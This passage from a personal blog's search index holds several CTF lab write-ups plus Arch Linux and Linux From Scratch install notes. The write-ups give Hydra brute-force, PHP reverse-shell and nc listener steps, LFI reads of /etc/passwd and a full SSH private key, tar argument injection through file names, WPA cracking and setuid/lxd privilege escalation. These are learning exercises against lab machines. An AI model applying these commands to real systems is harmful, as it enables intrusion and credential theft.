+$(&#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;&#x2F;dev&#x2F;null \\; -delete &#x2F;etc&#x2F;cron.d&#x2F;php5:09,39 * * * * root [ -x &#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime ] &amp;&amp; [ -d &#x2F;var&#x2F;lib&#x2F;php5 ] &amp;&amp; find &#x2F;var&#x2F;lib&#x2F;php5&#x2F; -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(&#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;&#x2F;dev&#x2F;null \\; -delete --- Modify: 09,39 * * * * root [ -x &#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime ] &amp;&amp; [ -d &#x2F;var&#x2F;lib&#x2F;php5 ] &amp;&amp; find &#x2F;var&#x2F;lib&#x2F;php5&#x2F; -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(&#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;&#x2F;dev&#x2F;null \\; -delete hydra -L user.txt -P pass.txt 192.168.0.24 -V http-form-post “/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=&lt;form name=’loginform’”","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Eric","slug":"CTF_Eric","date":"2022-10-20T12:11:51.721Z","updated":"2022-10-20T12:45:37.387Z","comments":true,"path":"/post/CTF_Eric.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Eric.html","excerpt":"","text":"Netdiscover Rustscan Port 80","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Hacksudo3","slug":"CTF_Hacksudo3","date":"2022-10-18T16:48:30.357Z","updated":"2022-10-20T11:55:28.107Z","comments":true,"path":"/post/CTF_Hacksudo3.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Hacksudo3.html","excerpt":"","text":"rustscanPort 80, 22 websiteNothing for the moment Gobustergobuster dir -u http://192.168.0.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html --wildcard switch |grep \"Status: 200\" login.php generator.phpdisplay things info.phpLot of infos:system: Linux hacksudo 5.8.0-45-generic #51-Ubuntu SMP Fri Feb 19 13:24:51 UTC 2021 x86_64PHP: 7.4.9Apache: 2.4.46 Reverse shellDownload ithttps://pentestmonkey.net/tools/web-shells/php-reverse-shell Change itThis it my IP, and I will use this port. Listennc -lnvp 4848 Create a web server on my computer Download Use itAnd I’m in. Enumerationlse.sh`wget \"https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh\" -O lse.sh;chmod 700 lse.sh` /usr/bin/pingseam like I can’t exploit it for the moment.CVE:I’m not gonna use them. First flagIn /var/www cat ha* Output: unpxfhqb ybpxre FFU hfreanzr:unpxfhqb cnffjbeq:63p9142792q571q0s7p28ro30626q6s38792n2r7679o76q784231676q62447so80ns8953745s709p6622qqn2po4q754p262q0q31o3030n08s7o524079n6o336o It’s meaning something but it’s encoded. hacksudo locker SSH username:hacksudo password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b SSHIt’s not the password: Decode password vishal I’m in. Enumerationlse.sh`wget \"https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh\" -O lse.sh;chmod 700 lse.sh` /home/hacksudo/locker/php deluser hacksudo sudo hacksudo adm cdrom dip plugdev lxd Exploit lxdI just follow this, too lazy to write more about it, cuz I have to play sea of thieves soon.https://initblog.com/2019/lxd-root/￼Exploit lxdI just follow this, too lazy to write more about it, cuz I have to play sea of thieves soon.https://initblog.com/2019/lxd-root/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Micro Storage","slug":"CTF_Micro_Storage","date":"2022-10-16T20:25:19.525Z","updated":"2022-10-18T09:31:27.861Z","comments":true,"path":"/post/CTF_Micro_Storage.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Micro_Storage.html","excerpt":"","text":"CTF Micro Storage Form HTBWe just have the IP address and the port, we have to use netcat to connect. nc $ip $port We have 6 option, it’s a script who ask us what we want to do.This user recommand us to figure out which commands are executed for each option. Options1 UploadWe have enter the name of the file, can’t excape with &gt;,|,&amp;,;,} and more.Then we have to write the text and exit with EOF (End Of File).Linit of 10 files, I should try to explose it. 2 List my uploadIt’s using ls, maybe. 3 Delete a filerm 4 PrintIt’s a cat or echo. 5 Compress &amp; DownloadThis one look more interesting.On the server:On my computer:So they are using the command tar -cf and they encode it in base64. Exploithttps://gtfobins.github.io/gtfobins/tar/ I can add arguments when I create the file, the title of the file will be the argument.I’m creating 3 files, 2 for the arguments because he don’t like spaces and one for the script.Then generate it twice. z","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Eternal Loop","slug":"Eternal Loop","date":"2022-09-26T00:15:52.000Z","updated":"2022-09-29T09:41:18.456Z","comments":true,"path":"/post/Eternal Loop.html","link":"","permalink":"https://peanutstick.github.io/post/Eternal%20Loop.html","excerpt":"","text":"ChallengeThe passwordI have a zip file but I don’t have the password, I have to find it.The password is the numbers in the next file, so the password for 37366 is 5900.I can extract the password like this: Loop to extractI will create a loop too extract the file, because there is a .zip into a .zip, I can’t do it manualy. #!/bin/bash current_file=\"37366.zip\" while true; do password=$(strings $current_file |tail -1 | cut -d '.' -f1) unzip -P $password $current_file current_file=$password\".zip\" echo \"$current_file\" >> track.txt done In the file track.txt I have the list of the names of the files, I’m using this file to know wish file is the last one.The last file is 6969.zip and there is a file called DoNotTouch.zip.I don’t have the password for this one, I have to crack it.I have to put rockyou in my directory. fcrackzip -u -D -p rockyou.txt 6969.zip Output: PASSWORD FOUND!!!!: pw &#x3D;&#x3D; letmeinplease Open the last zip fileunzip -P letmeinplease 6969.zip Now we have the file DoNotTouch. file DoNotTouch Output: DoNotTouch: SQLite 3.x database, last written using SQLite version 3021000, page size 1024, file counter 26, database pages 864, cookie 0x22, schema 1, UTF-8, version-valid-for 26 SQL file, I will use strings :). strings DoNotTouch|grep HTB Output: 1969-01-01 00:00:002069-01-01 00:00:00Chillin with SatanHellHTB&#123;z1p_and_unz1p_ma_bruddahs&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Fresh install of Arch","slug":"Fresh install of Arch","date":"2022-07-09T17:30:52.000Z","updated":"2023-02-05T12:59:13.211Z","comments":true,"path":"/post/Fresh install of Arch.html","link":"","permalink":"https://peanutstick.github.io/post/Fresh%20install%20of%20Arch.html","excerpt":"","text":"WhyI would like to reinstall Arch because I have few problems: I can’t use the FN key to manage the brightness. My screen is blinking in really fast sometimes. I have too many partitions. Polybar don’t start at every startup. Wine doesn’t work fine with fewer games. Plus: I have it for one year. I have 1770 packages, Few kernels it will take too much time to fix it. HowPartitionsI will use fillezilla to transfer the files to an another computer. And compress them. As you can see it’s a bit messy.I will use LVM to manage the space.I don’t use only one partion for one disk because I like to see where it’s full or not with df. DEI won’t use xfce anymore, I don’t want to use xrandr, I need something grphical for my screen. It’s cool to use the terminal but sometimes I just wan’t someting easy to use. Maybe there is something opensource to do it. So no DE, only WM.bspwm. Wayland VS Xorghttps://linuxcool.net/en/reviews/laptops-last-longer-with-wayland-than-with-xorg/I’m on laptop, I need more battery life.Wayland is better for that but, it’s still buggy and don’t support bspwm. Xorg win. Apps bspwm sxhkd networkmanager pipewire timeshift polybar lf (ranger like) pcmanfm dragon firefox (because of css) picom ohmyzsh kitty steam / lutris / moonlight virtualbox Pentest tools obsidian obs kitty libre office rofi kdenlive mpv / vlc qBittorent flameshot vim (for coding, fuck VScode)And more dependancies… Let’s goAll my files are saved, I’m booting on the USB stick with the new iso of Arch. PartitionI will store everything in the home directory, it’s not serious to store my files in the /.For my games I will use the hdd because I don’t have lot of space in my nvme| Disk | LV | Nom logique | Usage |Space || :——– |:—————| :——————| :———————— |:———————— ||/dev/nvme0n1| / |base | for the system | 70%FREE||/dev/sda| /timeshift |timeshift | for backups | 100 GB||/dev/sda| /home |home | for home | 100%FREE| echo -e \"d\\nw\\ny\" | fdisk /dev/sda echo -e \"d\\nw\\ny\" | fdisk /dev/nvme0n1 echo -e \"n\\np\\n1\\n\\n\\nw\\ny\" | fdisk /dev/sda echo -e \"n\\np\\n1\\n\\n\\nw\\ny\" | fdisk /dev/nvme0n1 pvcreate /dev/nvme0n1p1 vgcreate NVME /dev/nvme0n1p1 lvcreate --size 500M -n lvefi NVME lvcreate -l +100%FREE -n lvbase NVME mkfs -t ext4 /dev/NVME/lvbase mkfs.fat -F32 /dev/nvme0n1p1 mount /dev/NVME/lvbase /mnt mkdir /mnt/home mkdir /mnt/timeshift mkdir /mnt/boot/efi mount /dev/nvme0n1p1 /mnt/boot/efi pvcreate /dev/sda1 vgcreate HDD /dev/sda1 lvcreate --size 100G -n lvtime HDD lvcreate -l +100%FREE -n lvhdd HDD mkfs -t ext4 /dev/HDD/lvhdd mkfs -t ext4 /dev/HDD/lvtime mount /dev/HDD/lvhdd /mnt/home mount /dev/HDD/lvtime /mnt/timeshift pacstrap /mnt base base-devel linux linux-firmware genfstab -U /mnt >> /mnt/etc/fstab;arch-chroot /mnt bash -c 'pacman -Syu grub sudo efibootmgr networkmanager openssh intel-ucode vim zsh bspwm sxhkd kitty xclip dmenu polybar pipewire pipewire-alsa pipewire-pulse pipewire-jack pavucontrol xorg xorg-xinit xorg-server lightdm-gtk-greeter lightdm firefox; grub-install /dev/sda;grub-mkconfig -o /boot/grub/grub.cfg' arch-chroot /mnt ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime hwclock --systohc en_US.UTF-8 UTF-8 echo \"en_US.UTF-8 UTF-8\" >> /etc/locale.gen locale-gen echo \"LANG=fr_FR.UTF-8\" >> /etc/locale.conf echo \"KEYMAP=fr\" >> /etc/vconsole.conf systemctl enable NetworkManager lightdm mkdir /boot/efi mount /dev/nvme0n1p1 /boot/efi grub-install --target=x86_64-efi --bootloader-id=GRUB --efi-directory=/boot/efi --removable grub-mkconfig -o /boot/grub/grub.cfg passwd vim /etc/sudoers %wheel ALL=(ALL) NOPASSWD: ALL n=\"peanutstick\" echo \"$n\" > /etc/hostname echo \"127.0.0.1 localhost\" >> /etc/hosts echo \"::1 localhost\" >> /etc/hosts echo \"127.0.1.1 \"$n\".localdomain \"$n >> /etc/hosts useradd -m -s /bin/zsh peanutstick usermod -a -G wheel peanutstick passwd peanutstick exit umount -R /mnt reboot ![[Pasted image 20220709185234.png]] sed -i \"s/^#ParallelDownloads = 5$/ParallelDownloads = 15/\" /etc/pacman.conf pacman --noconfirm -Sy archlinux-keyring timedatectl set-ntp true mkfs.ext4 /dev/nvme0n1p4 mount /dev/nvme0n1p4 /mnt pacstrap /mnt base base-devel linux linux-firmware genfstab -U /mnt >> /mnt/etc/fstab arch-chroot /mnt sed -i \"s/^#ParallelDownloads = 5$/ParallelDownloads = 15/\" /etc/pacman.confln -sf /usr/share ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime hwclock --systohc echo \"en_US.UTF-8 UTF-8\" >> /etc/locale.gen locale-gen echo \"LANG=en_US.UTF-8\" > /etc/locale.conf echo \"KEYMAP=fr\" > /etc/vconsole.conf echo \"peanutstick\" > /etc/hostname echo \"127.0.0.1 localhost\" >> /etc/hosts echo \"::1 localhost\" >> /etc/hosts echo \"127.0.1.1 peanutstick.localdomain peanutstick\" >> /etc/hosts mkinitcpio -P pacman --noconfirm -S networkmanager grub openssh vim G efibootmgr os-prober systemctl enable NetworkManager sshd echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config passwd Then I reboot to see if my other arch can see him. I can see it, I add it to my grub menu.Now I can boot directly on Arch n°2. Connect to wifinmcli radio wifi on nmcli dev wifi list sudo nmcli dev wifi connect network-ssid password \"network-password\" User + shellpacman -S zsh git sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" vim /etc/sudoers %wheel ALL=(ALL) NOPASSWD: ALL useradd -m peanutstick usermod -a -G wheel peanutstick passwd peanutstick sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" PartitonI deleted my partition with my games ;( AHHHHHHI still have the one with my movies. sudo mkdir /main sudo mount /dev/nvme0n1p3 /main # My old home I don’t thisk it’s a good idea to use an another drive for the home","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"DIGITALWORLD: FALL ","slug":"DIGITALWORLD FALL","date":"2022-07-03T04:30:52.000Z","updated":"2022-09-27T07:49:09.968Z","comments":true,"path":"/post/DIGITALWORLD FALL.html","link":"","permalink":"https://peanutstick.github.io/post/DIGITALWORLD%20FALL.html","excerpt":"","text":"netdiscover192.168.0.24 rustscanrustscan -a 192.168.0.24 --ulimit 10000 The port 80, 443 and 9090 are interesting. Port 9090A login page.Fedora server Port 443 Simple CMS 2.2.15 There is an exploit on this version:https://www.exploit-db.com/exploits/49345 gobustergobuster dir -u http://192.168.0.27 -w Documents/wordlist/directory-list-2.3-medium.txt -x php --wildcard switch Admin login pagehttp://192.168.0.27/admin/login.php Users qiu InfosThey have a problem about a backdoor. LFIhttp://192.168.0.27/test.phphttps://book.hacktricks.xyz/pentesting-web/file-inclusion http://192.168.0.27/test.php?file=/etc/passwd root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:Kernel Overflow User:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-coredump:x:999:996:systemd Core Dumper:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-network:x:192:192:systemd Network Management:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-resolve:x:193:193:systemd Resolver:&#x2F;:&#x2F;sbin&#x2F;nologin dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin polkitd:x:998:995:User for polkitd:&#x2F;:&#x2F;sbin&#x2F;nologin sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin cockpit-ws:x:997:993:User for cockpit-ws:&#x2F;:&#x2F;sbin&#x2F;nologin rpc:x:32:32:Rpcbind Daemon:&#x2F;var&#x2F;lib&#x2F;rpcbind:&#x2F;sbin&#x2F;nologin ntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologin abrt:x:173:173::&#x2F;etc&#x2F;abrt:&#x2F;sbin&#x2F;nologin rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin chrony:x:996:991::&#x2F;var&#x2F;lib&#x2F;chrony:&#x2F;sbin&#x2F;nologin tcpdump:x:72:72::&#x2F;:&#x2F;sbin&#x2F;nologin qiu:x:1000:1000:qiu:&#x2F;home&#x2F;qiu:&#x2F;bin&#x2F;bash apache:x:48:48:Apache:&#x2F;usr&#x2F;share&#x2F;httpd:&#x2F;sbin&#x2F;nologin nginx:x:995:990:Nginx web server:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin tss:x:59:59:Account used by the tpm2-abrmd package to sandbox the tpm2-abrmd daemon:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin clevis:x:994:989:Clevis Decryption Framework unprivileged user:&#x2F;var&#x2F;cache&#x2F;clevis:&#x2F;sbin&#x2F;nologin mysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;false The user qiu also exist on the system I can access to his home directoryhttp://192.168.0.27/test.php?file=/home/qiu/.bashrc # .bashrc # Source global definitions if [ -f &#x2F;etc&#x2F;bashrc ]; then . &#x2F;etc&#x2F;bashrc fi # Uncomment the following line if you don&#39;t like systemctl&#39;s auto-paging feature: # export SYSTEMD_PAGER&#x3D; # User specific aliases and functions id_rsa keyhttp://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0 FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX 61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj&#x2F;+uQlokUMtdc4NOv4XGJbp7GdEWBZevien qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw&#x2F;AfZ9ib21JGlOyy8cflTlogrZPoICCXIV&#x2F;kxGK0d Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO NY16EA&#x2F;NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP&#x2F;65CW iRQy11zg06&#x2F;hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom&#x2F;uel5BLUhdT1Wc&#x2F;ctaU4YVTSP4hLl KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G NWQcGzA4jgph96uLkNM&#x2F;X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6&#x2F;BY9RuaGG5B2DikbB 8t&#x2F;CDO79q7ccfTZs+gOVRX4PW641+cZxo5&#x2F;gL3GcdJwDY4ggPwbU&#x2F;m8sYsyN1NWJ8NH00d X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C&#x2F;8rseZsSJSxoXKk CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC&#x2F;TTqOIH+FXA66cFx3X4uOCjkzT0&#x2F;Es0uNyZ07qQ 58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0 acm4&#x2F;icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329 JW3Db+KISMRIvdpJv+eiKQLg&#x2F;epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT&#x2F;+ Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g&#x2F;uztWJuLpFe3Ue&#x2F;MLgeJ+2TiAw9yYoPVySNK8 uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC -----END OPENSSH PRIVATE KEY----- wget 'http://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa' -o id_rsa chmod 600 id_rsa sshssh qiu@192.168.0.27 -i id_rsa I’m in :D It’s too late now.Let’s see what is in the history. echo \"remarkablyawesomE\" | sudo -S dnf update sudo -i I’m root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Victim1: ","slug":"CTF_Victim 1","date":"2022-06-26T21:48:52.000Z","updated":"2022-09-27T07:49:11.061Z","comments":true,"path":"/post/CTF_Victim 1.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Victim%201.html","excerpt":"","text":"Netdiscoversudo netdiscover 192.168.0.23 rustscanrustscan -a 192.168.0.23 Output: Port 80gobuster dir -u http://192.168.0.23 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt Output:http://192.168.0.23/robots.txtOn some pages I have this error:In the htaccess file I have this message. I think it’s a joomla server.http://192.168.0.23/htaccess.txt End - Joomla! core SEF Section. Port 9000I can use gobuster on this page because he return the error 500 (Internal server error). gobuster dir -u http://192.168.0.23:9000 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt --wildcard switch Output:But:Nothing interesting. Port 8999It’s useless to run the gobuster scan on this web serveur because we already have the directories. It’s like an index of/ page. It’s an webfs/1.21 server with a cap file.I have to open it with wireshark. WPA-01.capThis is a capture of a wireless stream, with the SSID: dlink I have to use aircrack-ng to find the password in the cap file with a directory attack. aircrack-ng -w Documents/wordlist/rockyou.txt /home/peanutstick/Downloads/WPA-01.cap The password for the SSID dlink is p4ssword. SSHI can use the user dlink to login via SSH. ssh dlink@192.168.0.23 EnumCan’t check the .bash_history.With lse.sh:There is nothing in /usr/bin/TryHarder! Uncommon setuidhttps://gtfobins.github.io/gtfobins/nohup/I can’t use the commmand with sudo. /usr/bin/nohup /bin/sh -p -c \"sh -p &lt;$(tty) >$(tty) 2>$(tty)\" I’m root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Install Linux From Scratch","slug":"Linux From Scratch","date":"2022-06-18T21:48:52.000Z","updated":"2022-09-27T07:49:09.778Z","comments":true,"path":"/post/Linux From Scratch.html","link":"","permalink":"https://peanutstick.github.io/post/Linux%20From%20Scratch.html","excerpt":"","text":"What is it ?Linux from scratch is a book that explain how install linux from scratch.https://linuxfromscratch.org/ Why ?I would like to learn more about linux. I’t will not be the best distro, for daily usage it’s better to use something else. DisclamerThis is not a tutorial, I’m reading the book from the beginning, I skip some checking step here. InstallPartitionhttps://linuxfromscratch.org/lfs/view/stable/chapter02/creatingfilesystem.htmlI don’t have free space left to create a new partition, I have to umout an existing partition to split it.I need 20G of space. sudo umount /iso Then I resize it with gparted and create the new partition.I create a ext4 partiton.I will use the root user for everything now. Setting The $LFS Variableexport LFS=/mnt/lfs It’s just a shortcut, instead of typing /mnt/lfs you can do $LFS.To be sure do this command. echo $LFS Mounting the New Partitionmkdir -pv $LFS mount -v -t ext4 /dev/sda2 $LFS I will add it to the fstab cuz it’s already late and I will restart my computer. echo \"/dev/sda2 /mnt/lfs ext4 defaults 1 1\" >> /etc/fstab Source directoryhttps://linuxfromscratch.org/lfs/view/stable/chapter03/introduction.htmlIn this few lines I create thee source directory, then I download the list with the required packages.Then I download them via wget. Do it as root ! su - root mkdir -v $LFS/sources chmod -v a+wt $LFS/sources cd /tmp curl https://linuxfromscratch.org/lfs/view/stable/wget-list -o wget-list wget --input-file=wget-list --continue --directory-prefix=$LFS/sources It’s downloading the patches tooI can verify the packages but, nop. Creating a limited directory layout in LFS filesystemhttps://linuxfromscratch.org/lfs/view/stable/chapter04/creatingminlayout.htmlAs root with the LFS variable.I’m creating the directories for the new system. mkdir -pv $LFS/&#123;etc,var&#125; $LFS/usr/&#123;bin,lib,sbin&#125; for i in bin lib sbin; do ln -sv usr/$i $LFS/$i done case $(uname -m) in x86_64) mkdir -pv $LFS/lib64 ;; esac The cross compiler mkdir -pv $LFS/tools Adding the LFS Userhttps://linuxfromscratch.org/lfs/view/stable/chapter04/addinguser.htmlWhen logged in as user root, making a single mistake can damage or destroy a system.As root, create the user lfs. groupadd lfs useradd -s /bin/bash -g lfs -m -k /dev/null lfs passwd lfs Password: toorGrant access to lfs to all directories. chown -v lfs $LFS/&#123;usr&#123;,/*&#125;,lib,var,etc,bin,sbin,tools&#125; case $(uname -m) in x86_64) chown -v lfs $LFS/lib64 ;; esac chown -v lfs $LFS/sources su - lfs Now I can work as lfs instead of root, it’s better like that. Setting Up the EnvironmentWith the user lfs.Create the .bash_profile cat > ~/.bash_profile &lt;&lt; \"EOF\" `exec env -i HOME=$HOME TERM=$TERM PS1='\\u:\\w\\$ ' /bin/bash` EOF Create the .bashrc cat > ~/.bashrc &lt;&lt; \"EOF\" `set +h umask 022 LFS=/mnt/lfs LC_ALL=POSIX LFS_TGT=$(uname -m)-lfs-linux-gnu PATH=/usr/bin if [ ! -L /bin ]; then PATH=/bin:$PATH; fi PATH=$LFS/tools/bin:$PATH CONFIG_SITE=$LFS/usr/share/config.site export LFS LC_ALL LFS_TGT PATH CONFIG_SITE` EOF Several commercial distributions add a non-documented instantiation of /etc/bash.bashrc to the initialization of bash. This file has the potential to modify the lfs user’s environment in ways that can affect the building of critical LFS packages. To make sure the lfs user’s environment is clean, check for the presence of /etc/bash.bashrc and, if present, move it out of the way. As the root user, run:As root run: exit [ ! -e /etc/bash.bashrc ] || mv -v /etc/bash.bashrc /etc/bash.bashrc.NOUSE su - lfs export LFS=/mnt/lfs source ~/.bash_profile CompilationThe page about compilation:https://linuxfromscratch.org/lfs/view/stable/partintro/toolchaintechnotes.htmlIf it take too much time to compile I will do it later.It’s already too hot in my room because of the heat wave, so if I compile I will die. I have to compile binutils first. cd $LFS/sources tar -xvf binutils-2.38.tar.xz mkdir -v build cd build Now prepare Binutils for compilation: ../configure --prefix=$LFS/tools \\ --with-sysroot=$LFS \\ --target=$LFS_TGT \\ --disable-nls \\ --disable-werror The makefile is created.continue with compiling the package: make Install the package: make install GCC-11.2.0 - Pass 1https://linuxfromscratch.org/lfs/view/stable/chapter05/gcc-pass1.htmlExtract gcc: tar -xvf gcc-11.2.0.tar.xz cd gcc-11.2.0 tar -xf ../mpfr-4.1.0.tar.xz mv -v mpfr-4.1.0 mpfr tar -xf ../gmp-6.2.1.tar.xz mv -v gmp-6.2.1 gmp tar -xf ../mpc-1.2.1.tar.gz mv -v mpc-1.2.1 mpc On x86_64 hosts, set the default directory name for 64-bit libraries to “lib”: case $(uname -m) in x86_64) sed -e '/m64=/s/lib64/lib/' \\ -i.orig gcc/config/i386/t-linux64 ;; esac Create the build directorie. mkdir -v build cd build Prepare GCC for compilation: ../configure \\ --target=$LFS_TGT \\ --prefix=$LFS/tools \\ --with-glibc-version=2.35 \\ --with-sysroot=$LFS \\ --with-newlib \\ --without-headers \\ --enable-initfini-array \\ --disable-nls \\ --disable-shared \\ --disable-multilib \\ --disable-decimal-float \\ --disable-threads \\ --disable-libatomic \\ --disable-libgomp \\ --disable-libquadmath \\ --disable-libssp \\ --disable-libvtv \\ --disable-libstdcxx \\ --enable-languages=c,c++ continue with compiling the package: make Install the package: make install cd .. cat gcc/limitx.h gcc/glimits.h gcc/limity.h > \\ `dirname $($LFS_TGT-gcc -print-libgcc-file-name)`/install-tools/include/limits.h I had lot of trouble here, if you have an error, compile binutils again.Be sure you have the environement set: set | grep LFS Linux-5.16.9 API Headerstar -xf linux-5.16.9.tar.xz cd linux-5.16.9 make mrproper Make the header in /usr make headers find usr/include -name '.*' -delete rm usr/include/Makefile cp -rv usr/include $LFS/usr Glibc-2.35create a symbolic link for LSB compliance for proper operation of the dynamic library loader: case $(uname -m) in i?86) ln -sfv ld-linux.so.2 $LFS/lib/ld-lsb.so.3 ;; x86_64) ln -sfv ../lib/ld-linux-x86-64.so.2 $LFS/lib64 ln -sfv ../lib/ld-linux-x86-64.so.2 